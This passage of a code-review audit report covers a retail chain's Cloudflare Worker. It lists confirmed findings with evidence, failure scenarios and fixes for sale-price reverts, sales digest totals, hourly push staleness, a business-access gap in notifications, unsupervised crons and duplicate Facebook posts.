**Evidence.** The revert catch (worker.js:1637-1643) marks every failure the same way: `UPDATE sale_schedules SET status='error', error_msg=? WHERE id=?`. That covers the deliberate drift guard and also transient causes: `Clover GET item ... 429` once cloverFetch's 3 retries run out (worker.js:1375), a 5xx, or a network throw. The cron only selects `status='active'` (1615), so an 'error' row is never retried. The result is not even logged: `ctx.waitUntil(processSaleSchedules(env, new Date()))` (28229) discards it, and no pushSuperusers call exists on this path. cancel-sale-schedule only reads `status IN ('pending','active')` (28004), so it cannot revert an errored row. list-sale-schedules ranks `error` highest (27987), so the group shows as 'Error'. The UI then offers only 'Remove' for a finished group (index.html ~31612-31616), and delete-sale-schedule (28050) runs `DELETE FROM sale_schedules WHERE schedule_group=?`, removing original_price and original_name. Up to 50 reverts go out at once on one merchant token (`Promise.allSettled((active.results || []).map(...))`, 1619). The repo itself runs Clover calls one at a time per store to avoid 429s (worker.js:20994-20997).

**Failure scenario.** A 40-item weekend sale ends at 00:00 Sunday. The tick fires 40 GETs plus 40 POSTs at one Clover token. Some calls exhaust their 429 retries, or Clover returns one 502. Those items are marked 'error' and stay in the POS at the sale price, with 'SALE … (was $X)' names, indefinitely. No push or email goes out. On Monday a manager sees 'Error' and presses the only button, 'Remove'. That deletes the only stored original price, and restoring it means reading '(was $X)' off each register label by hand.

**Proposed fix.** Worker-only, adds safety. (1) In the revert catch, finalise only the drift case: `if (/^Price drifted/.test(err.message)) { ...status='error'... } else { await env.DB.prepare("UPDATE sale_schedules SET error_msg=? WHERE id=? AND status='active'").bind(msg,row.id).run(); }`. The row stays 'active' and the next minute's tick retries it. (2) Cap concurrency: replace the two `Promise.allSettled(rows.map(...))` calls with chunks of 5 (`for (let i=0;i<rows.length;i+=5) await Promise.allSettled(rows.slice(i,i+5).map(fn))`). (3) Alert on anything final or long-running: at the end, `if (terminal.length || stuckReverts.length) await pushSuperusers(env,{title:'⚠️ Sale scheduler', body: ..., tag:'sale-sched'})`. Here stuckReverts are active rows whose ends_at is more than 15 min past. (4) Log the result: `.then(r => { if (r.activated||r.reverted||r.errors?.length) console.log('sale-scheduler:', JSON.stringify(r)); })`. (5) In delete-sale-schedule, refuse when any row has `status='error' AND sale_price IS NOT NULL AND reverted_at IS NULL`, because that row holds the only undo record. Optionally let cancel-sale-schedule also select those rows; its existing `item.price === row.sale_price ? row.original_price : item.price` guard already makes that safe.

**Verifier (confirmed).** Verified each part. The revert catch at 1637-1643 writes status='error' for every cause, including `Clover GET item ... 429` from getCloverItem (1503) and a thrown fetch. The revert SELECT (1615) reads only 'active' rows, so an errored row is never retried. `ctx.waitUntil(processSaleSchedules(env, new Date()))` (28229) drops the result, and nothing on this path calls pushSuperusers. cancel-sale-schedule selects only pending/active rows (28004). list ranks error highest (27987). The UI's `finished` includes 'error' (index.html:31611), so the only button is Remove. removeSaleSchedule (31663) has no uiConfirm, and delete-sale-schedule runs `DELETE FROM sale_schedules WHERE schedule_group=?` (28050). The UI does show the item's errorMsg (31617-31621), so the problem is visible but not actionable. Related issue: because error outranks active, a group where one item failed to activate while the rest are running shows 'Error' and loses its 'Cancel & restore' button, although the cancel route would still revert the active rows. Fanning 50 rows out at once on one token is exactly the pattern the repo avoids elsewhere (20994-20997). *Fix notes:* Part (1) leaves every non-drift error 'active' and retries it every minute with no bound. A permanent failure never resolves: 404 for an item deleted in Clover, 401/403 for a revoked token, or a 400 from the POST. The revert SELECT is `ORDER BY ends_at ASC LIMIT 50`, so once 50 such rows pile up they are always first and starve every later revert. Retry only transient causes (`/\b(429|5\d\d)\b|network|fetch|timed? ?out/i` on the message). Cap it, e.g. keep retrying until ends_at + 24 h, then finalise 'error' and alert. Parts (2) chunked concurrency, (3) the alert, (4) logging and (5) the delete guard are sound and worker-only. Also fix the UI: show 'Cancel & restore' whenever any item in the group is pending or active, and put uiConfirm on Remove. That is a frontend-only change of a few lines.

<a id="worker-cron-notify-3"></a>
#### worker-cron-notify-3 — Weekly digest 'Net Sales' leaves out auction revenue but is compared against a budget that includes it

*high · minor · bug · confidence high · `worker.js:7143` · ✅ confirmed*

**Evidence.** worker.js:7142-7150: `SELECT store, ROUND(SUM(total),2) AS sales, ROUND(SUM(budget),2) AS budget ... WHERE ... AND total IS NOT NULL`. The prior week also uses only `SUM(total)`. Everywhere else in this unit net is `total + auction`: buildDailySummaryData (5485: `const sales = (Number(r.total) || 0) + auction; // net = POS total + auction`), buildWeeklyByDayData (5562) and reportedFigures. The morning-briefing contract (6045-6050) records why: 'It previously carried POS only while the budget assumed auction counted toward it, which overstated every auction store's miss (chain-wide that was ~2x the real variance).' I ran this in node against in-memory SQLite: BL2 with $5,000 POS + $800 auction per day over 3 days gives buildWeeklyDigestData sales = 15000, against a true net of 17400. The header comment (7132) also says 'Mon–Sun'; the week is Sun–Sat.

**Failure scenario.** Every Sunday the digest emails and pushes each auction store's week understated by its auction revenue. The vs-Budget % and the chain headline are understated too, so the executives' weekly email shows a bigger miss than the daily emails for the same days. The Daily Breakdown's week-to-date adds auction, so the two emails disagree about the same week.

**Proposed fix.** In buildWeeklyDigestData, change both queries to `SELECT store, ROUND(SUM(COALESCE(total,0) + COALESCE(auction,0)),2) AS sales, ... FROM daily_sales WHERE date >= ? AND date <= ? AND (total IS NOT NULL OR auction IS NOT NULL) GROUP BY store`. That keeps vs-LW like-for-like, since both weeks then include auction. Fix the comment to 'Sun–Sat'. Verify with the node harness above: BL2 must read 17400. Also compare one real week's digest total with the sum of that week's daily-email Totals.

**Verifier (confirmed).** worker.js:7142-7150 sums only `total` for both weeks. Every other net figure in the unit adds auction (5485, 5562-5563, the contract comment at 6045-6050). Ran the sliced buildWeeklyDigestData against in-memory SQLite: BL2 at $5,000 POS + $800 auction for 3 days gives sales 15000; the true net is 17400. The same run shows the digest DOES include closed BL8's budget, because the Sheet's total=0 IS NOT NULL. So the digest carries Holland's budget while understating auction stores' sales. The header comment at 7132 says Mon–Sun, while the cron comment (28246-28249) and the date maths make it Sun–Sat. *Fix notes:* The proposed `SUM(COALESCE(total,0)+COALESCE(auction,0))` on both weeks keeps vs-LW like-for-like, and the `(total IS NOT NULL OR auction IS NOT NULL)` filter is right. Worker-only, email-only. Caveat: the digest fires at 11:00 UTC (7 AM EDT), while the daily summary was deliberately placed at 12:00 UTC 'after the 7 AM auction feeder' (28237-28238). Saturday's auction may therefore not be in D1 when the digest reads it. Consider moving the digest cron to 12:xx UTC as a separate wrangler.toml change, updating the staging trigger list too, and read the crons back after deploy.

<a id="worker-cron-notify-4"></a>
#### worker-cron-notify-4 — Hourly 'Sales Update' push reads today's D1 row, which only a dashboard visit refreshes; it shows stale or $0 figures under the current time

*high · minor · bug · confidence medium · `worker.js:8094` · ✅ confirmed*

**Evidence.** worker.js:8093-8096: `// Fetch today's running totals + budget from D1` → `SELECT store, total, order_count, budget FROM daily_sales WHERE date = ?`. Only two paths write today's row during the day: the live `?store=` route (`ctx.waitUntil(saveSnapshot(env, targetStore, et.dateStr, aggregate))`, 28202) when someone opens the dashboard, and admin re-snapshots. The only nightly writer is the 03:55 UTC cron. buildAfternoonBriefingData says so outright (6298-6300: 'today's rows are not written until the 03:55 cron. So it goes live to Clover'). Before any dashboard view, the row is the Sheet's placeholder: 'the Sheet writes a literal 0 into every row it has no actuals for (including ... every future date through December)' (6053-6056, 6413-6415). The push is titled `Sales Update — ${timeLabel}` (8179-8181) and carries no as-of time.

**Failure scenario.** At the 10:00 AM ET tick, if nobody has opened the dashboard since the store opened, every opted-in user is pushed 'Coliseum $0.00 / $11,899.00 -100%'. Later in the day, if the last view of Battle Creek was at 12:40, the 3:00 PM push shows 12:40 figures labelled 3:00 PM. The chain headline adds up these mixed-age numbers.

**Proposed fix.** Worker-only, contract unchanged. Build the lines from the live, already-tested path instead of D1. After filtering `users` (so a tick with no recipients costs nothing), call `const live = await buildAfternoonBriefingData(env).catch(() => null);`. That is ~3 Clover subrequests per store, run in parallel, and already ET/DST-correct. Then map `snapshotMap[s.storeId] = s.reportingStatus === 'no_data' ? null : { total: s.salesSoFarToday, budget: s.todayBudget }`, so a failed store renders as `${label} —` rather than a stale number. Fallback if live fails: keep the D1 read, but add `snapshot_time` to the SELECT and render any row older than ~75 min, or with a null snapshot_time, as `${label} — (as of h:mm)`. Verify by running scheduled({cron:'0 * * * *'}) under the scripts/test-interval-summary.mjs harness with a stubbed Clover fetch, and check that the body uses the stubbed live total rather than the D1 value.

**Verifier (confirmed).** dispatchIntervalSummary (8093-8096) reads today's daily_sales row. The only intraday writers are the live `?store=` route (`ctx.waitUntil(saveSnapshot(...))`, 28202) and the admin re-snapshot (18822). The cron list has no intraday snapshot job; the hourly slot only runs the interval summary and the FB comment ingest (28220-28223). index.html has no periodic loadAll/?store= refresh: its setIntervals (11729, 11755, 11788) only re-render the hourly overlay or wait on local data. So each figure is as old as the last dashboard view of that store. Before any view, the row is the Sheet's placeholder with total=0, which D1 holds through 2026-12-26 per 6413-6415, so the push reads '$0.00 / $budget -100%'. The title `Sales Update — ${timeLabel}` (8179-8181) carries no as-of time. Rated medium, not high: during trading hours dashboard traffic keeps most rows fairly fresh, and tapping the push opens /?view=hourly, which renders live data. *Fix notes:* Calling buildAfternoonBriefingData once per tick, after the recipient filter, is sound: about 12-18 Clover calls an hour, already allSettled per store, ET/DST-correct, and the return shape matches (storeId, salesSoFarToday, todayBudget, reportingStatus; 6326-6400). Caveat: it totals with aggregateOrders + refunds, while the live dashboard card uses the item-pipeline total (28175-28180). Push figures can differ slightly from what the tap-through shows; the drift is normally under $1 per the 4715-4730 comments. Closed BL8 maps to 'closed' → $0 / budget, the same as today and deliberate. The D1 fallback with snapshot_time as-of labelling is a good degrade path.

<a id="worker-cron-notify-6"></a>
#### worker-cron-notify-6 — Daily summary email drops closed Holland's budget from its by-store total and disagrees with its own Daily Breakdown; stores that did not report are silently left out

*high · minor · bug · confidence high · `worker.js:5486` · ✅ confirmed*

**Evidence.** buildDailySummaryData (5479-5491): `if (!r) continue; // no row → omit` and `if (sales <= 0) continue; // closed / no sales → omit`, and `totBudget` only sums stores that survive. buildWeeklyByDayData (5547-5550) sums `SUM(budget)` over every ALL_STORES row, including BL8. STORE_CLOSED_FROM (5875-5881) and tasks/lessons.md (2026-09-16: 'we removed Holland from the frontend but were supposed to keep the budget untouched — its budget came out of the all stores budget') record that the chain must carry Holland's budget. I ran this in node against in-memory SQLite (5 open stores at $5,000/$5,500, plus BL8 closed with total 0 and budget $5,249). By-store table: sales 25800, budget 27500 (94%). Daily Breakdown for the same date: actual 25800, budget 32749, variance −6949. The push body (7043-7046) uses the 27500 figure. Stores that simply did not report (nightly failed, row holds the Sheet's 0) are dropped the same way. The chain-wide path still sends '$0.00 across all stores' when nothing reported (7030-7049), while the scoped path skips an empty body on purpose (6943-6949).

**Failure scenario.** Every morning the chain email and push say 'Budget: 94%' while the Daily Breakdown lower in the same email shows the day $6,949 under. Holland's shortfall disappears from the headline, which is the exact regression Brian reported on 2026-09-16 for the dashboard. When one store's nightly snapshot fails, the 'All Stores' total quietly shrinks with no 'not reported' marker. When all fail, superusers are pushed '$0.00 across all stores'.

**Proposed fix.** Change the email only; nothing writes data. In buildDailySummaryData add `snapshot_time, is_manual_override` to the SELECT and classify each in-scope store with `classifyReportingStatus(rowMap[store], store, date)`. For 'closed', add `budget` to `totBudget`, and either add a '(closed)' row with $0 or add the budget only; which one is Brian's call, since his decision fixes only that the chain carries it. For 'no_data', push the label into `notReported[]` and exclude that store from both sides, matching periodTotals. For 'reported', keep today's logic. In buildSummaryEmailHtml, render `Not reported: X, Y` under the table when non-empty, and append ` (5 of 6 stores)` to the push body. In dispatchDailySummary, if `data.stores.length === 0` return `{ error: `no store reported for ${date}` }` instead of sending, so superviseCronJob alerts. Verify with the node harness: the by-store budget equals the Daily Breakdown budget for the same date, 32749.

**Verifier (confirmed).** Ran the sliced buildDailySummaryData against SQLite: 5 open stores plus BL8 (total 0, budget 5249) gives totals sales 25800 / budget 27500, and BL8 is omitted (`if (sales <= 0) continue`, 5486). buildWeeklyByDayData sums budget over all ALL_STORES rows (5547-5550), and in my run the weekly digest builder also counted BL8's budget. So the chain budget in the daily email headline and push (7043-7046) disagrees with its own Daily Breakdown and with the Sunday digest. STORE_CLOSED_FROM (5875-5881, Brian 2026-08-11) and tasks/lessons.md 2026-09-16 say the chain must carry Holland's budget. Stores that did not report (total 0 from the Sheet) are dropped the same way. The chain path still sends '$0.00 across all stores' when data.stores is empty (7030-7049); the scoped path skips that case (6943-6949). *Fix notes:* Email-only and worker-only; nothing is written. Prefer adding a 'Holland (closed)' row at $0 against its budget over a budget-only addition: lessons rule 18 says a chain total with a per-store breakdown must gain a row when it gains a store. buildDailySummaryData is shared with the scoped path (6932) and the preview route (21611). Keep the scoped 'nothing reported' skip meaningful by testing whether any store is 'reported', not `data.stores.length`, or a group scoped only to BL8 would start receiving a $0 email. For 'no_data', excluding the store from both sides is fine. Note that the Daily Breakdown's WTD still counts that day's budget (5566-5570), so render the 'Not reported' line so readers understand the gap.

<a id="worker-cron-notify-5"></a>
#### worker-cron-notify-5 — Interval push skips the business gate: an admin holding only an E-Commerce grant is pushed chain-wide Bargain Lane sales every hour

*medium · minor · security · confidence high · `worker.js:8139` · ✅ confirmed*

**Evidence.** worker.js:8126-8141 checks `canSeeFinancials(user)`, then `const allow = allowedStores(user); // null = every store`. allowedUnits returns null for any `role === 'admin'` before it looks at grants (14527). The cron's own recipient builders add the missing check on purpose: chainWideRecipients (6816-6818: `allowedStores(u) === null && (u.role === 'superuser' || canAccessBusiness(u, 'bl'))`, with the comment 'without this an admin holding only E-Commerce would be emailed Bargain Lane's revenue') and storeScopedRecipients (6876). dispatchIntervalSummary has no canAccessBusiness call. I ran worker.scheduled({cron:'0 * * * *'}) in node, using the test-interval-summary harness with a pinned clock, for an admin whose only grant row is ('ecom','admin',null). The result was `interval-summary: {"ok":true,"sent":1,"skipped":0}`. The existing test cannot catch this because it gives every non-superuser a 'bl' grant (test-interval-summary.mjs:69).

**Failure scenario.** Access is managed through set-user-grants. An E-Commerce admin with no Bargain Lane grant turns on 'Sales updates: every hour' (update-notif-prefs is reachable for them). From then on they receive every Bargain Lane store's sales and budget ten times a day, although the request path and both daily-email builders refuse them that data.

**Proposed fix.** After `user.grants = ...` (8135-8137) add `if (!canAccessBusiness(user, 'bl')) { summary.skipped++; continue; }`. canAccessBusiness returns true for superuser without grants, and the LEFT JOIN already loads the bl grant. Add a case to scripts/test-interval-summary.mjs: an admin with only an `ecom` grant row must produce skipped=1, and adding them must not change `sent`.

**Verifier (confirmed).** Reproduced by running worker.scheduled({cron:'0 * * * *'}) in node on a copy of worker.js, with the clock pinned to 14:00 ET, an in-memory SQLite D1, and an admin whose only grant row is ('ecom','admin',null). Output: `interval-summary: {"ok":true,"sent":1,"skipped":0}`. The code at 8126-8141 checks canSeeFinancials and allowedStores. allowedUnits returns null for any role==='admin' before it reads grants (14527), and there is no canAccessBusiness call. Both daily recipient builders add that check deliberately (6816-6818, 6876). update-notif-prefs is business-agnostic (4932) and non-financial (14609), so such a user can opt in. test-interval-summary.mjs gives every non-superuser a 'bl' grant (line 69), so the existing test cannot see this. *Fix notes:* `if (!canAccessBusiness(user, 'bl')) { summary.skipped++; continue; }` after user.grants is assigned is correct. superuser short-circuits by role, and the LEFT JOIN already filters to business_id='bl'. It also drops a manager who has no bl grant and relies on the users.stores fallback. storeScopedRecipients makes the same trade deliberately ('Every prod manager holds a grant'), so this matches house policy. Existing test cases all carry bl grants, so none of them change. Add the ecom-only admin case as proposed.

<a id="worker-cron-notify-7"></a>
#### worker-cron-notify-7 — Nightly snapshot cron is not supervised: a top-level throw, a runtime kill, or a swallowed D1 write never raises an alert

*medium · minor · bug · confidence high · `worker.js:28273` · ✅ confirmed*

**Evidence.** The '55 3 * * *' branch runs inline in scheduled() and is not wrapped in superviseCronJob, unlike daily-summary, weekly-digest and interval-summary (28221/28244/28257). `const [overrides, itemCosts] = await Promise.all([fetchItemOverrides(env), fetchItemCosts(env)]);` (28273) sits outside any try, and both are bare KV gets (3630, 3681). The only alert is at the very end (28444-28452) and only for `results[s].startsWith('error:')`. saveSnapshot swallows a D1 failure (4663-4665: `console.error(`D1 write failed ...`)`), so fetchAggregateAndSnapshot returns data and the store reads `sales: 'ok'`. Failures in the clientCreatedTime sweep (28360-28362), unbanked days (`NEEDS ATTENTION`, 28399-28401), rollup (28409) and sheet import (28438) only reach console. The stage-budget comment at 15626-15628 ('~180 + ~258 ... comfortably inside 1,000') does not count the 18 sweep snapshots or the 6 bank days that now run in the same invocation.

**Failure scenario.** A KV blip at 03:55 UTC throws from fetchItemOverrides, so no store is snapshotted, nothing is banked, the sheet is not imported, and no one is told. Or D1 rejects the upsert for one store: results says 'ok', no alert, and the 8 AM email silently omits that store (see finding 6). Or the invocation hits a platform limit partway through the sweep: the runtime kills it before line 28444, so again no alert. The team learns the next day from wrong numbers, not from an alert.

**Proposed fix.** Adds safety only. (1) Move the fall-through body into `async function runNightlySnapshot(env, ctx)`, a mechanical move, and call `ctx.waitUntil(superviseCronJob(env, 'nightly-snapshot', runNightlySnapshot(env, ctx)))`. Have it return `{ error: [...] }` naming failedStores, sweep failures, bankBad stores and a failed sheet import, so cronJobProblem alerts on them. (2) In saveSnapshot's D1 catch, `throw e` after logging. The live route calls it inside waitUntil, so that is harmless there, and the nightly per-store try then records `error:`. (3) As a dead-man's switch against runtime kills, write `env.SALES_SNAPSHOTS.put('cron:nightly:ok', todayStr)` as the last statement. At the start of dispatchDailySummary, alert via alertJobFailure if that key is not yesterday's date. Verify by running scheduled({cron:'55 3 * * *'}) offline with a KV stub that throws on get: exactly one alert must be attempted.

**Verifier (confirmed).** The '55 3' fall-through (28270-28453) is the only notification-era cron not wrapped in superviseCronJob. `Promise.all([fetchItemOverrides, fetchItemCosts])` at 28273 sits outside any try, and both are bare KV gets. saveSnapshot catches the D1 upsert failure and only logs it (4663-4665), so fetchAggregateAndSnapshot returns data and results[store] is 'ok' (28325-28326). Sweep failures (28360-28362), bankBad 'NEEDS ATTENTION' (28399-28401), rollup (28409) and sheet import (28438) only reach console. The only alert is failedStores at the end (28444-28452), so a kill before that line alerts nobody. *Fix notes:* Part (2), making saveSnapshot `throw e`, changes what the nightly path writes. In the nightly per-store try, the throw lands after fetchAggregateAndSnapshot, so `saveItemSalesSnapshot` (28329-28334) is skipped. A D1 blip would then also lose today's KV item snapshot, which the daily email's category table reads. It also turns the live route's waitUntil into an unhandled rejection, and changes the admin re-snapshot response (18822-18833). That last change is an improvement, but it touches a repair path. Better: have saveSnapshot record the failure without throwing, e.g. set `data.d1Error = e.message`. Then set `results[store].d1 = 'error'` in the nightly loop and include it in failedStores. Part (1) does not need a 170-line mechanical move. Wrap the fall-through in `try { ... } catch (e) { await alertJobFailure(env, 'nightly-snapshot', e.message); }`, and add bankBad, sweep failures and a failed sheet import to the alert. That is a few lines, worker-only. The heartbeat in part (3) is sound: 03:55 UTC is still the same ET date that dispatchDailySummary's `date` names at 12:00 UTC, in both EDT and EST.

<a id="worker-cron-notify-8"></a>
#### worker-cron-notify-8 — Scheduled Facebook posts can be published twice: every failure at the /feed step is retried, and the retry cannot see a post Facebook actually created

*medium · minor · bug · confidence medium · `worker.js:15426` · ✅ confirmed*

**Evidence.** publishDraft reports every Facebook-side failure as `status: 502` (15276, 15304). processScheduledPosts treats `r.status >= 500` or an error text matching `/\b(network|timeout|fetch|...)\b/` as transient (15426) and requeues with backoff (15427-15430). The retry re-uploads every photo and sends a new /feed POST. The only duplicate guard is `alreadyPosted()`, which needs a `marketing_publish_log` row with a post_id (15374-15376). That row is written only after the /feed response is parsed (15295-15297). If `fetch(.../feed)` throws, for example 'Network connection lost' after Meta committed, the exception skips the log insert (caught at 15420). If Graph returns an error body after creating the post, the log row has post_id NULL. The comment at 15411 calls reconcile 'the only guard against an ambiguous-outcome duplicate', but the ambiguous case is exactly the one it cannot see. A second route: the reaper requeues any 'publishing' row whose claimed_at is older than 5 min (15369, 15381). There is no photo cap per draft, and the uploads run one after another, so a very large draft on a slow Graph API can still be mid-publish when the reaper requeues it.

**Failure scenario.** A Thursday bin post fires at 10:00. Meta accepts the /feed POST, but the connection drops before the Worker reads the response. The 10:02 retry finds no log row, uploads the photos again and posts again, so the store's Page shows the same bin post twice to customers. A '(#200) permissions' error at /feed is also 'transient' (502, no terminal hint), so it is tried three times and leaves orphaned unpublished photos on the Page.

**Proposed fix.** (1) In publishDraft, wrap the /feed fetch in try/catch. On throw, insert a log row with status 'ambiguous' and return `{ ok:false, stage:'feed', ambiguous:true, error:'Facebook did not answer — the post may exist' }`. Also return `stage:'upload'` from the photo-upload failure at 15276 and `stage:'feed'` from the one at 15304. (2) In processScheduledPosts, requeue only when `r.stage === 'upload'` (or earlier) and the failure is transient. Any `stage === 'feed'` failure goes to `failSchedule(env,row.id,'Facebook may or may not have posted — check the Page before retrying',nowIso,true)`. (3) Refresh `claimed_at` after each photo upload (`UPDATE marketing_drafts SET claimed_at=? WHERE id=? AND status='publishing'`) so the reaper's 5-min staleness means 'no progress' and not 'slow'. Verify with a stubbed fetch that throws on /feed: the draft must end in schedule_error, one alert must be sent, and there must be no second /feed call on the next tick.

**Verifier (confirmed).** Traced it. If `fetch(.../feed)` (15288) throws, publishDraft throws before the marketing_publish_log insert (15293-15297). processScheduledPosts catches it as `{ ok:false, error: e.message }` (15419-15420). Cloudflare's 'Network connection lost.' matches the `\bnetwork\b` transient regex (15426) and no terminalHint, so the row is requeued (15427-15430). alreadyPosted (15374-15376) needs a log row with a post_id, so the retry uploads the photos again and posts again: a duplicate public post. A /feed Graph error such as '(#200) ...' returns status 502 (15304) with no terminal hint, so it is retried up to MAX_ATTEMPTS and orphans an unpublished photo set each time. The reaper route (5-minute staleness, 15369/15381) needs a very slow multi-photo upload and is less likely. The whole path is low-probability but public-facing. *Fix notes:* Treating any feed-stage failure as terminal (failSchedule plus the alert) is the right trade: it gives up automatic retry for a clean Graph 5xx at /feed in exchange for never double-posting. A status of 'ambiguous' is safe in the log table because status is free TEXT (migration-021) and alreadyPosted filters to published/staged. Upload-stage failures can keep retrying, since no feed post exists yet. publishDraft is shared with the manual publish route, and the added `stage` fields are additive there. Refreshing claimed_at after each upload is sound, and conditional on status='publishing'. About 20 lines, worker-only.

<a id="worker-cron-notify-9"></a>
#### worker-cron-notify-9 — Failure alerts go by push only and cannot report their own failure; push-only jobs never count as failed

*medium · minor · bug · confidence high · `worker.js:7357` · ✅ confirmed*

**Evidence.** alertJobFailure (7354-7365) awaits `pushSuperusers(...)` and ignores its `{ sent }`. pushSuperusers returns `{ sent: 0 }` straight away when VAPID keys are missing (7298), and sends to no one when no superuser has a live subscription. A browser that rotated its subscription gets a 410 and is deleted (7312-7313). cronJobProblem (7340-7350) counts only `email.failed`, never `push.failed`. dispatchIntervalSummary, a push-only job, returns bare `undefined` when VAPID is not configured (8081), which cronJobProblem reads as success. Its summary has no failure counter, and `summary.sent++` runs even when every push threw (8192-8200). dispatchCronFailureAlert (7321) and dispatchScheduleFailureAlert (15333) also depend only on push.

**Failure scenario.** Brian reinstalls the PWA, so his old subscription answers 410 and is deleted. From then on every '⚠️ Snapshot Error', '⚠️ Notification job failed' and '⚠️ Scheduled post failed' is sent to zero devices, and the log line says `{sent:0}`. Or a VAPID secret is dropped by a bad deploy (tasks/lessons.md 2026-07-15 records such a config regression). The hourly push stops for everyone, the cron logs `interval-summary: undefined`, and nothing alerts, because the alert channel is the channel that broke.

**Proposed fix.** (1) In alertJobFailure: `const r = await pushSuperusers(...); if (!r || !r.sent) await emailSuperusers(env, job, detail);`. emailSuperusers is a ~10-line helper using resendSend to active superusers, with idempotency key `cron-fail-${job}-${etDate}` so a failure repeated every minute sends one mail per day. (2) In dispatchIntervalSummary, return `{ error: 'VAPID keys not configured' }` instead of a bare return. Count `summary.failed` in the push catch, and have cronJobProblem flag `r.failed > 0 && !r.delivered`. (3) Route dispatchCronFailureAlert and dispatchScheduleFailureAlert through the same fallback, which is automatic once finding 10 folds the latter into pushSuperusers.

**Verifier (confirmed).** alertJobFailure (7354-7365) ignores pushSuperusers' `{ sent }`. pushSuperusers returns `{ sent: 0 }` when VAPID is missing (7298). cronJobProblem (7340-7350) counts only email.failed. dispatchIntervalSummary returns bare undefined when VAPID is missing (8081), which cronJobProblem treats as success. Its `summary.sent++` (8200) runs per user even when every push threw or the user has no subscriptions. dispatchCronFailureAlert and dispatchScheduleFailureAlert are push-only. One thing makes this more likely than the finding says: index.html never re-syncs an existing browser subscription to the server. Its getSubscription check at 12163-12168 only flips the toggle, and sw.js has no pushsubscriptionchange handler. Once a rotated or 410'd subscription is deleted server-side, the superuser's Settings can still read 'enabled' while the server holds no subscription. *Fix notes:* An email fallback in alertJobFailure when `!r.sent` is correct, and so are the per-job-per-ET-day idempotency key (it suppresses repeats) and returning `{ error: 'VAPID keys not configured' }` from dispatchIntervalSummary. For the interval job, count delivered pushes per subscription rather than per user. Route dispatchCronFailureAlert through the same fallback too; it calls pushSuperusers directly and not alertJobFailure. Worker-only, about 25 lines.

<a id="worker-cron-notify-10"></a>
#### worker-cron-notify-10 — dispatchScheduleFailureAlert is a fourth hand-copied superuser push loop

*low · minor · code-quality · confidence high · `worker.js:15332` · ✅ confirmed*

**Evidence.** worker.js:15332-15353 re-implements the superuser SELECT, the per-user subscription query, sendWebPush and the 404/410 delete. pushSuperusers' own comment says it is 'The one copy of this loop' (7295-7296). The copies have already drifted: this one returns undefined, while pushSuperusers returns `{ sent }`.

**Failure scenario.** Any fix to superuser alerting, such as the email fallback in finding 9 or a change to dead-subscription handling, lands in pushSuperusers and silently misses the scheduled-post alert, the one alert raised when no human is watching.

**Proposed fix.** Replace the body with `return pushSuperusers(env, { title: '⚠️ Scheduled post failed', body: `Post #${draftId}: ${reason}`.slice(0, 180), tag: 'schedule-error' });`, a net deletion of ~15 lines. failSchedule's `try { await dispatchScheduleFailureAlert(...) } catch (_) {}` stays unchanged.

**Verifier (confirmed).** worker.js:15332-15353 duplicates pushSuperusers (7297-7318): the same superuser SELECT, per-user subscription SELECT, sendWebPush call and 404/410 delete. It returns undefined where pushSuperusers returns `{ sent }`. Its only caller is failSchedule (15359), which wraps it in try/catch and ignores the return value. *Fix notes:* `return pushSuperusers(env, { title: '⚠️ Scheduled post failed', body: `Post #${draftId}: ${reason}`.slice(0,180), tag: 'schedule-error' });` behaves the same: identical DB/VAPID guard, url defaults to '/', and dead-subscription handling is the same. It is a net deletion and needs no caller change.

<a id="worker-cron-notify-11"></a>
#### worker-cron-notify-11 — Interval push headline says 'All Stores' to managers who only see their own stores

*low · minor · ui-ux · confidence high · `worker.js:8173` · ✅ confirmed*

**Evidence.** worker.js:8168-8176: `// "All Stores" headline = sum across this user's permitted stores.` → `headline = `All Stores ${fmtK(chainSales)} / ...``. The daily email fixed this same mislabel on purpose (6684-6691: 'Neither may keep saying "All Stores" on a store-scoped send ... mislabelling them as the chain misreports revenue by an order of magnitude'), using 'Total' for one store and 'My Stores' for several.

**Failure scenario.** A Coliseum-only manager's lock screen shows 'All Stores $10,214.00 / $11,899.00 -14%' then 'Coliseum $10,214.00 / ...'. It reads as if the whole chain did $10k, and the first line only repeats the second.

**Proposed fix.** Before building the headline: `const headLabel = allow === null ? 'All Stores' : (userStores.length === 1 ? null : 'My Stores');`. When headLabel is null (single store), drop the headline and send only the store line. Otherwise use `${headLabel} ${fmtK(chainSales)} ...`. Same words as dispatchScopedDailySummaries.

**Verifier (confirmed).** I checked the code and the finding holds. In worker.js:8140-8141 the recipient set is scoped by `const allow = allowedStores(user); const userStores = allow === null ? ALL_STORES : ALL_STORES.filter(s => allow.includes(s));`. chainSales and chainBudget are then summed over userStores only (8154-8166). The headline label does not follow that scope: at 8173 and 8175 it is always `headline = `All Stores ${fmtK(chainSales)} ...`` with no branch on `allow`. Managers can reach this send. `FINANCIAL_ROLES = new Set(['superuser','admin','executive','manager'])` (worker.js:14592) passes the canSeeFinancials check at 8131. The Settings radio group 'Interval sales updates' (index.html:6315-6335) is not role-hidden and even says 'running totals for your stores'. sw.js:67-80 shows `data.body` as-is, so the store-scoped total reaches the lock screen as its first line, under the label 'All Stores'. For a single-store manager the first line then repeats the store line with a chain label. The code itself treats this as a bug: the daily email path was fixed on purpose (6684-6691: 'Neither may keep saying "All Stores" on a store-scoped send ... mislabelling them as the chain misreports revenue by an order of magnitude'), and it uses 'Total'/'My Stores' (6952-6956, and again at 21608-21609). The scoped daily push uses 'at <store>' / 'across your stores' (6963). I found nothing in tasks/lessons.md, tasks/todo.md, MEMORY.md or DESIGN.md that makes the interval wording deliberate. scripts/test-interval-summary.mjs only asserts sent/skipped counts, not the body text, so the change will not break it. Severity stays low: every figure is correct for the recipient's scope and only the label is wrong. The strongest case against low is a manager covering 2-3 stores, who could read or forward that line as the chain total. Given the precedent above, the owner may want to rate it medium. *Fix notes:* The fix is correct and minor: about 10 lines in dispatchIntervalSummary, worker-only. The payload keeps the same shape ({title, body, tag, url}) and only the body text changes, so it is backward-compatible with sw.js and index.html, and it can deploy on its own. Suggested shape: `const headLabel = allow === null ? 'All Stores' : (userStores.length === 1 ? null : 'My Stores');`. Build `headline` only when headLabel is set, then `const lines = headLabel ? [headline, ...storeLines] : storeLines;`. Edge case: a single-store user whose store has no snapshot gets the body 'Coliseum —', which is still a sensible notification. In the same edit, update the stale comments at 8143-8146 (the notification-preview-v3 example) and 8168 ('"All Stores" headline = ...'). Optional: a manager granted all six stores gets allow as an array, not null, so they would see 'My Stores'. That is still accurate and matches how the daily email labels a scoped send. Add one body assertion to scripts/test-interval-summary.mjs (single-store manager: body has no 'All Stores'; superuser: body starts with 'All Stores'). The body can be captured by stubbing sendWebPush, 